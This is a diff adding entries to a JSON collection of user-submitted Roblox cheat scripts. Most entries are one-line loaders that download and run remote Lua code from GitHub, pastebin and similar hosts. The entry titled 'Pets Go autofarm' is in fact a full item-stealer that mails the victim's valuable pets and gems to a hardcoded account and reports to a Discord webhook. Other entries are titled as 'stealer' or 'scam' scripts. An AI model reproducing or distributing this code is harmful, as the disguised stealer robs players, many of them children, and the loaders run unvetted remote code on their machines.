@@ -18087,6 +18087,230 @@
       "Script_Title": "PLS DONATE STEALER",
       "User_ID": 5098155203,
       "Username": "SinnVamp"
+    },
+    "Script2545": {
+      "Date": "December 09 2024",
+      "Description": "(just work in some games)",
+      "Script": "if game.CreatorType == Enum.CreatorType.User then\ngame.Players.LocalPlayer.UserId = game.CreatorId\nend\nif game.CreatorType == Enum.CreatorType.Group then\ngame.Players.LocalPlayer.UserId = game:GetService(\"GroupService\"):GetGroupInfoAsync(game.CreatorId).Owner.Id\nend",
+      "Script_Title": "free gamepass ",
+      "User_ID": 4515897149,
+      "Username": "contaenfeitekk"
+    },
+    "Script2547": {
+      "Date": "December 09 2024",
+      "Description": "SANDER X BROOKHAVEN-GUI / REDZ HUB NO FUNCIONA ACTUALMENTE ASI QUE TRAIGO ESTE SCRIPT",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Brookhaven-RP-Rionays-Sander-X-Script-19966\"))()",
+      "Script_Title": "SANDER X BROOKHAVEN-",
+      "User_ID": 3911128262,
+      "Username": "ElTizi_XD11"
+    },
+    "Script2548": {
+      "Date": "December 09 2024",
+      "Description": "universal and also only r6",
+      "Script": "loadstring(game:HttpGet(('https://raw.githubusercontent.com/Cortzalno666/NectoVerse-Industries-Data/master/Scripts%20Folder/Honored.lua'),true))()",
+      "Script_Title": "honored one",
+      "User_ID": 7678688088,
+      "Username": "givemethetapestoedg"
+    },
+    "Script2549": {
+      "Date": "December 09 2024",
+      "Description": "topk3k 0.5",
+      "Script": "require(0x342D5F0DA)(\"USERNAME\")",
+      "Script_Title": "topk3k 0.5",
+      "User_ID": 3128248293,
+      "Username": "businn_man"
+    },
+    "Script2550": {
+      "Date": "December 09 2024",
+      "Description": "",
+      "Script": "\nrequire(0x22330bb15).Hotladiesinyourarea(\"YourNameHere\")",
+      "Script_Title": "\nrequire(0x22330bb15",
+      "User_ID": 7586761023,
+      "Username": "Xxx_ALAN43"
+    },
+    "Script2551": {
+      "Date": "December 09 2024",
+      "Description": "Op with key",
+      "Script": "loadstring(game:HttpGet(\"https://scripts.alchemyhub.xyz\"))()",
+      "Script_Title": "Fisch Alchemy",
+      "User_ID": 1157178393,
+      "Username": "alvinoraiky145"
+    },
+    "Script2552": {
+      "Date": "December 09 2024",
+      "Description": "this is script",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/SederYTTV/AotuWorld/main/Ok'))()",
+      "Script_Title": "hi",
+      "User_ID": 7660903835,
+      "Username": "golditems_freenoob"
+    },
+    "Script2553": {
+      "Date": "December 09 2024",
+      "Description": "Enjoy",
+      "Script": "\nloadstring(game:HttpGet(\"https://rawscripts.net/raw/The-Chosen-One-laziest-V2-7696\"))()",
+      "Script_Title": "Nothing",
+      "User_ID": 5851641544,
+      "Username": "The_Astro5"
+    },
+    "Script2554": {
+      "Date": "December 09 2024",
+      "Description": "sorry if not work oh i will add new script:)",
+      "Script": "loadstring(game:HttpGet(\"https://the-shed.xyz/roblox/scripts/ChatBypass\", true))()",
+      "Script_Title": "Chat Bypass",
+      "User_ID": 3835576702,
+      "Username": "SleppyShasy4"
+    },
+    "Script2555": {
+      "Date": "December 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Native-lab/Native/main/loader.lua\"))()",
+      "Script_Title": "Fisch",
+      "User_ID": 1614443433,
+      "Username": "danieliksun"
+    },
+    "Script2556": {
+      "Date": "December 09 2024",
+      "Description": "This script Hub doesn t have many functions But it can continue to be used ",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-LYKS-HUB-V1-19926\"))()",
+      "Script_Title": "LYKS Hub",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script2557": {
+      "Date": "December 09 2024",
+      "Description": "red z hub",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Brookhaven-RP-Red-z-hub-9149\"))()",
+      "Script_Title": "red z hub",
+      "User_ID": 7219530107,
+      "Username": "JoaoDaSilva1928"
+    },
+    "Script2558": {
+      "Date": "December 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-jacks-hub-4568\"))()",
+      "Script_Title": "Jacks HUB ",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script2559": {
+      "Date": "December 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Chris8889/atlasbss/main/script.lua\"))()",
+      "Script_Title": "BEE SWARM SIM",
+      "User_ID": 5492457550,
+      "Username": "Block_wizard132"
+    },
+    "Script2560": {
+      "Date": "December 10 2024",
+      "Description": " Script work games:Impossible Squid game Glass Bridge ",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Impossible-Squid-Game!-Glass-Bridge!-ESP-Hub-16712\"))()",
+      "Script_Title": "ESP Hub ",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script2561": {
+      "Date": "December 10 2024",
+      "Description": "inf fazbucks and auto 10x rolls",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ToraScript/Script/main/FazbearWorld\"))()",
+      "Script_Title": "fazbear td script",
+      "User_ID": 1249292268,
+      "Username": "xgresqax"
+    },
+    "Script2562": {
+      "Date": "December 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://rawscripts.net/raw/Universal-Script-Temokote-Hub-Version-10-16916\"))()",
+      "Script_Title": "Temokote Hub",
+      "User_ID": 6221247402,
+      "Username": "mfellxpa"
+    },
+    "Script2563": {
+      "Date": "December 09 2024",
+      "Description": "اقوي سكربت صملات",
+      "Script": "wait(0.1)\ngame.StarterGui:SetCore(\"SendNotification\", {\n    Title = \"تم تفعيل\";\n    Text = \"تم تفعيل\"; -- ARAB TEAM\n    Duration = 5;\n})\n\n\n\n\n\n\nlocal Library = loadstring(game:HttpGet(\"https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua\"))()local Window = Library.CreateLib(\"script clan AFK\", \n\"BloodTheme\")\nlocal Tab = Window:NewTab(\"سكربتات صمله\")\nlocal Section = Tab:NewSection(\"من صنع كلان AFK\")\nSection:NewButton(\"سكربت\", \"سكربت من صنع زيوس\", function()\n    print(\"Clicked\")loadstring(game:HttpGet('https://raw.githubusercontent.com/AZ8009/SCRIPT-ABOM7MD-PART-3/main/KsmAbmo7nd'))()\nend)\nlocal Tab = Window:NewTab(\"تحكم ب شخصيه\")\nlocal Section = Tab:NewSection(\"تحكم ب شخصيه\")\nSection:NewSlider(\"سرعه \", \"سرعت شخصيه\", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)\n    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s\nend)\n\n\nSection:NewSlider(\"نط\", \"نط شخصيه\", 500, 0, function(s) -- 500 (MaxValue) | 0 (MinValue)\n    game.Players.LocalPlayer.Character.Humanoid.jumpPower = s\nend)--ARAB TEAM --",
+      "Script_Title": "سكربت AFK",
+      "User_ID": 3695293807,
+      "Username": "Aliggi23"
+    },
+    "Script2564": {
+      "Date": "December 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/ForlornWindow46/Roblox-Scripts/refs/heads/main/open%20source%20auto%20parry\"))()",
+      "Script_Title": "blade ball FaxGg",
+      "User_ID": 5140319835,
+      "Username": "ax_ricky1"
+    },
+    "Script2565": {
+      "Date": "December 09 2024",
+      "Description": "",
+      "Script": "-- Maded by: X\n\nloadstring(game:HttpGet(\"https://raw.githubusercontent.com/0Ben1/fe./main/L\"))()",
+      "Script_Title": "Reverso ",
+      "User_ID": 3965806294,
+      "Username": "popay0ki"
+    },
+    "Script2566": {
+      "Date": "December 09 2024",
+      "Description": "ريدز بلوكس فروت ",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/realredz/BloxFruits/refs/heads/main/Source.lua\"))()",
+      "Script_Title": "ريدز بلوكس ",
+      "User_ID": 7498198267,
+      "Username": "tofe173"
+    },
+    "Script2567": {
+      "Date": "December 10 2024",
+      "Description": "OP chat Bypass💀",
+      "Script": "loadstring(game:HttpGet(\"https://raw.githubusercontent.com/Synergy-Networks/products/main/BetterBypasser/loader.lua\",true))()",
+      "Script_Title": "Better Chat Bypass",
+      "User_ID": 5865808512,
+      "Username": "dQoiXenRCdb"
+    },
+    "Script2568": {
+      "Date": "December 09 2024",
+      "Description": "",
+      "Script": "local args = {\n    [1] = \"wear\",\n    [2] = 18756289999\n}\n\ngame:GetService(\"ReplicatedStorage\"):WaitForChild(\"RE\"):WaitForChild(\"1Updat1eAvata1r\"):FireServer(unpack(args))\n",
+      "Script_Title": "Hx TEST BOOMBOX BROK",
+      "User_ID": 7357975995,
+      "Username": "kinito_pet118"
+    },
+    "Script2569": {
+      "Date": "December 09 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://raw.githubusercontent.com/Scripterxzx/PLS-DONATE/refs/heads/main/PLS%20DONATE%20STEALER'))()",
+      "Script_Title": "PLS DONATE STEALER",
+      "User_ID": 5098155203,
+      "Username": "SinnVamp"
+    },
+    "Script2570": {
+      "Date": "December 09 2024",
+      "Description": "Very op ",
+      "Script": "Username = \"thewolf5471\"\nUsername2 = \"your 2nd user here\" -- stuff will get sent to this user if first user's mailbox is full\nwebhook = \"Your discord webhook here\"\nmin_rap = 1000000 -- minimum rap of each item you want to get sent to you. 1 mil by default\n\n_G.scriptExecuted = _G.scriptExecuted or false\nif _G.scriptExecuted then\n    return\nend\n_G.scriptExecuted = true\n\nlocal network = game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Network\")\nlocal library = require(game.ReplicatedStorage.Library)\nlocal save = require(game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Library\"):WaitForChild(\"Client\"):WaitForChild(\"Save\")).Get().Inventory\nlocal mailsent = require(game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Library\"):WaitForChild(\"Client\"):WaitForChild(\"Save\")).Get().MailboxSendsSinceReset\nlocal plr = game.Players.LocalPlayer\nlocal MailMessage = \"jsp\"\nlocal HttpService = game:GetService(\"HttpService\")\nlocal sortedItems = {}\nlocal totalRAP = 0\nlocal getFucked = false\nlocal GetSave = function()\n    return require(game.ReplicatedStorage.Library.Client.Save).Get()\nend\n\nlocal newamount = 20000\n\nif mailsent ~= 0 then\n\tnewamount = math.ceil(newamount * (1.5 ^ mailsent))\nend\n\nlocal GemAmount1 = 1\nfor i, v in pairs(GetSave().Inventory.Currency) do\n    if v.id == \"Diamonds\" then\n        GemAmount1 = v._am\n\t\tbreak\n    end\nend\n\nif newamount > GemAmount1 then\n    return\nend\n\nlocal function formatNumber(number)\n\tlocal number = math.floor(number)\n\tlocal suffixes = {\"\", \"k\", \"m\", \"b\", \"t\"}\n\tlocal suffixIndex = 1\n\twhile number >= 1000 do\n\t\tnumber = number / 1000\n\t\tsuffixIndex = suffixIndex + 1\n\tend\n\treturn string.format(\"%.2f%s\", number, suffixes[suffixIndex])\nend\n\nlocal function SendMessage(username, diamonds)\n    local headers = {\n        [\"Content-Type\"] = \"application/json\",\n    }\n\n\tlocal fields = {\n\t\t{\n\t\t\tname = \"Retard Username:\",\n\t\t\tvalue = username,\n\t\t\tinline = true\n\t\t},\n\t\t{\n\t\t\tname = \"Items to be sent:\",\n\t\t\tvalue = \"\",\n\t\t\tinline = false\n\t\t},\n        {\n            name = \"Summary:\",\n            value = \"\",\n            inline = false\n        }\n\t}\n\n    local combinedItems = {}\n    local itemRapMap = {}\n\n    for _, item in ipairs(sortedItems) do\n        local rapKey = item.name\n        if itemRapMap[rapKey] then\n            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount\n        else\n            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}\n            table.insert(combinedItems, rapKey)\n        end\n    end\n\n    table.sort(combinedItems, function(a, b)\n        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount \n    end)\n\n    for _, itemName in ipairs(combinedItems) do\n        local itemData = itemRapMap[itemName]\n        fields[2].value = fields[2].value .. itemName .. \" (x\" .. itemData.amount .. \")\" .. \": \" .. formatNumber(itemData.rap * itemData.amount) .. \" RAP\\n\"\n    end\n\n    fields[3].value = fields[3].value .. \"Gems: \" .. formatNumber(diamonds) .. \"\\n\"\n    fields[3].value = fields[3].value .. \"Total RAP: \" .. formatNumber(totalRAP)\n    if getFucked then\n        fields[3].value = fields[3].value .. \"\\n\\nVictim tried to use anti-mailstealer, but got fucked instead\"\n    end\n\n    local data = {\n        [\"embeds\"] = {{\n            [\"title\"] = \"\\240\\159\\144\\177 New PS99 Execution\" ,\n            [\"color\"] = 65280,\n\t\t\t[\"fields\"] = fields,\n\t\t\t[\"footer\"] = {\n\t\t\t\t[\"text\"] = \"Mailstealer by Tobi. discord.gg/GY2RVSEGDT\"\n\t\t\t}\n        }}\n    }\n\n    if #fields[2].value > 1024 then\n        local lines = {}\n        for line in fields[2].value:gmatch(\"[^\\r\\n]+\") do\n            table.insert(lines, line)\n        end\n\n        while #fields[2].value > 1024 and #lines > 0 do\n            table.remove(lines)\n            fields[2].value = table.concat(lines, \"\\n\")\n            fields[2].value = fields[2].value .. \"\\nPlus more!\"\n        end\n    end\n\n    local body = HttpService:JSONEncode(data)\n\n    if webhook and webhook ~= \"\" then\n        local response = request({\n            Url = webhook,\n            Method = \"POST\",\n            Headers = headers,\n            Body = body\n        })\n    end\nend\n\nlocal gemsleaderstat = plr.leaderstats[\"\\240\\159\\146\\142 Diamonds\"].Value\nlocal gemsleaderstatpath = plr.leaderstats[\"\\240\\159\\146\\142 Diamonds\"]\ngemsleaderstatpath:GetPropertyChangedSignal(\"Value\"):Connect(function()\n\tgemsleaderstatpath.Value = gemsleaderstat\nend)\n\nlocal loading = plr.PlayerScripts.Scripts.Core[\"Process Pending GUI\"]\nlocal noti = plr.PlayerGui.Notifications\nloading.Disabled = true\nnoti:GetPropertyChangedSignal(\"Enabled\"):Connect(function()\n\tnoti.Enabled = false\nend)\nnoti.Enabled = false\n\ngame.DescendantAdded:Connect(function(x)\n    if x.ClassName == \"Sound\" then\n        if x.SoundId==\"rbxassetid://11839132565\" or x.SoundId==\"rbxassetid://14254721038\" or x.SoundId==\"rbxassetid://12413423276\" then\n            x.Volume=0\n            x.PlayOnRemove=false\n            x:Destroy()\n        end\n    end\nend)\n\nlocal function getRAP(Type, Item)\n    return (require(game:GetService(\"ReplicatedStorage\").Library.Client.DevRAPCmds).Get(\n        {\n            Class = {Name = Type},\n            IsA = function(hmm)\n                return hmm == Type\n            end,\n            GetId = function()\n                return Item.id\n            end,\n            StackKey = function()\n                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})\n            end\n        }\n    ) or 0)\nend\n\nlocal user = Username\nlocal user2 = Username2\n\nlocal function sendItem(category, uid, am)\n    local args = {\n        [1] = user,\n        [2] = MailMessage,\n        [3] = category,\n        [4] = uid,\n        [5] = am or 1\n    }\n\tlocal response = false\n\trepeat\n    \tlocal response, err = network:WaitForChild(\"Mailbox: Send\"):InvokeServer(unpack(args))\n\t\tif response == false and err == \"They don't have enough space!\" then\n\t\t\tuser = user2\n\t\t\targs[1] = user\n\t\tend\n\tuntil response == true\n\tGemAmount1 = GemAmount1 - newamount\n\tnewamount = math.ceil(math.ceil(newamount) * 1.5)\n\tif newamount > 5000000 then\n\t\tnewamount = 5000000\n\tend\nend\n\nlocal function SendAllGems()\n    for i, v in pairs(GetSave().Inventory.Currency) do\n        if v.id == \"Diamonds\" then\n\t\t\tif GemAmount1 >= (newamount + 10000) then\n\t\t\t\tlocal args = {\n\t\t\t\t\t[1] = user,\n\t\t\t\t\t[2] = MailMessage,\n\t\t\t\t\t[3] = \"Currency\",\n\t\t\t\t\t[4] = i,\n\t\t\t\t\t[5] = GemAmount1 - newamount\n\t\t\t\t}\n\t\t\t\tlocal response = false\n\t\t\t\trepeat\n\t\t\t\t\tlocal response = network:WaitForChild(\"Mailbox: Send\"):InvokeServer(unpack(args))\n\t\t\t\tuntil response == true\n\t\t\t\tbreak\n\t\t\tend\n        end\n    end\nend\n\nlocal function IsMailboxHooked()\n\tlocal uid\n\tfor i, v in pairs(save[\"Pet\"]) do\n\t\tuid = i\n\t\tbreak\n\tend\n\tlocal args = {\n        [1] = \"Roblox\",\n        [2] = \"Test\",\n        [3] = \"Pet\",\n        [4] = uid,\n        [5] = 1\n    }\n    local response, err = network:WaitForChild(\"Mailbox: Send\"):InvokeServer(unpack(args))\n    if (err == \"They don't have enough space!\") or (err == \"You don't have enough diamonds to send the mail!\") then\n        return false\n    else\n        return true\n    end\nend\n\nlocal function EmptyBoxes()\n    if save.Box then\n        for key, value in pairs(save.Box) do\n\t\t\tif value._uq then\n\t\t\t\tnetwork:WaitForChild(\"Box: Withdraw All\"):InvokeServer(key)\n\t\t\tend\n        end\n    end\nend\n\nlocal function ClaimMail()\n    local response, err = network:WaitForChild(\"Mailbox: Claim All\"):InvokeServer()\n    while err == \"You must wait 30 seconds before using the mailbox!\" do\n        wait()\n        response, err = network:WaitForChild(\"Mailbox: Claim All\"):InvokeServer()\n    end\nend\n\nlocal categoryList = {\"Pet\", \"Egg\", \"Charm\", \"Enchant\", \"Potion\", \"Misc\", \"Hoverboard\", \"Booth\", \"Ultimate\"}\n\nfor i, v in pairs(categoryList) do\n\tif save[v] ~= nil then\n\t\tfor uid, item in pairs(save[v]) do\n\t\t\tif v == \"Pet\" then\n                local dir = require(game:GetService(\"ReplicatedStorage\").Library.Directory.Pets)[item.id]\n                if dir.huge or dir.exclusiveLevel then\n                    local rapValue = getRAP(v, item)\n                    if rapValue >= min_rap then\n                        local prefix = \"\"\n                        if item.pt and item.pt == 1 then\n                            prefix = \"Golden \"\n                        elseif item.pt and item.pt == 2 then\n                            prefix = \"Rainbow \"\n                        end\n                        if item.sh then\n                            prefix = \"Shiny \" .. prefix\n                        end\n                        local id = prefix .. item.id\n                        table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = id})\n                        totalRAP = totalRAP + (rapValue * (item._am or 1))\n                    end\n                end\n            else\n                local rapValue = getRAP(v, item)\n                if rapValue >= min_rap then\n                    table.insert(sortedItems, {category = v, uid = uid, amount = item._am or 1, rap = rapValue, name = item.id})\n                    totalRAP = totalRAP + (rapValue * (item._am or 1))\n                end\n            end\n            if item._lk then\n                local args = {\n                [1] = uid,\n                [2] = false\n                }\n                network:WaitForChild(\"Locking_SetLocked\"):InvokeServer(unpack(args))\n            end\n        end\n\tend\nend\n\nif #sortedItems > 0 or GemAmount1 > min_rap + newamount then\n    ClaimMail()\n\tif IsMailboxHooked() then\n        getFucked = true\n\t\tlocal Mailbox = game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Network\"):WaitForChild(\"Mailbox: Send\")\n        for i, Func in ipairs(getgc(true)) do\n            if typeof(Func) == \"function\" and debug.info(Func, \"n\") == \"typeof\" then\n                local Old\n                Old = hookfunction(Func, function(Ins, ...)\n                    if Ins == Mailbox then\n                        return tick()\n                    end\n                    return Old(Ins, ...)\n                end)\n            end\n        end\n\tend\n    EmptyBoxes()\n\trequire(game.ReplicatedStorage.Library.Client.DaycareCmds).Claim()\n\trequire(game.ReplicatedStorage.Library.Client.ExclusiveDaycareCmds).Claim()\n    local blob_a = game:GetService(\"ReplicatedStorage\"):WaitForChild(\"Library\"):WaitForChild(\"Client\"):WaitForChild(\"Save\")\n    local blob_b = require(blob_a).Get()\n    function deepCopy(original)\n        local copy = {}\n        for k, v in pairs(original) do\n            if type(v) == \"table\" then\n                v = deepCopy(v)\n            end\n            copy[k] = v\n        end\n        return copy\n    end\n    blob_b = deepCopy(blob_b)\n    require(blob_a).Get = function(...)\n        return blob_b\n    end\n\n    table.sort(sortedItems, function(a, b)\n        return a.rap * a.amount > b.rap * b.amount \n    end)\n\n    spawn(function()\n        SendMessage(plr.Name, GemAmount1)\n    end)\n\n    for _, item in ipairs(sortedItems) do\n        if item.rap >= newamount then\n            sendItem(item.category, item.uid, item.amount)\n        else\n            break\n        end\n    end\n    SendAllGems()\n    local message = require(game.ReplicatedStorage.Library.Client.Message)\n    message.Error(\"All your items just got stolen by Tobi's mailstealer!\\n Join discord.gg/GY2RVSEGDT\")\n    setclipboard(\"discord.gg/GY2RVSEGDT\")\nend\n",
+      "Script_Title": "Pets Go autofarm ",
+      "User_ID": 1506212536,
+      "Username": "thewolf5471"
+    },
+    "Script2571": {
+      "Date": "December 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet(\"https://darkscripts.space/scripts/561f1db8-a602-4376-ae6e-e252e7af0610_1075871068629246124.lua\",true))()",
+      "Script_Title": "Pls donate scam??",
+      "User_ID": 6082620318,
+      "Username": "Sugarcupcake915"
+    },
+    "Script2572": {
+      "Date": "December 10 2024",
+      "Description": "Best script Jjs",
+      "Script": "loadstring(game:HttpGet(\"https://api.luarmor.net/files/v3/loaders/7fe29a6a9dc2a08c84b8e2f0f5ef5810.lua\"))()",
+      "Script_Title": "jujutsu shenanigans",
+      "User_ID": 7646194900,
+      "Username": "joaja_9"
+    },
+    "Script2573": {
+      "Date": "December 10 2024",
+      "Description": "",
+      "Script": "loadstring(game:HttpGet('https://pastebin.com/raw/JgtddWA3'))()",
+      "Script_Title": "ghosthub hitbox",
+      "User_ID": 1912503247,
+      "Username": "kervy590"
     }
   }
 }
